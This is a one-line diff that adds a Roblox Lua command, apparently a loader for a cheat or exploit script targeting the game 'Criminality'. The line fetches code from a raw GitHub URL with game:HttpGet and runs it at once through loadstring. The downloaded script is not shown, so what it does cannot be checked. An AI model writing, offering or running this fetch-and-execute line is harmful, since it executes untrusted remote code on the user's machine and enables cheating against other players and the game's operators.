@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/2x-criminality-spam1-l8xyd01lofb5m7.lua"))()
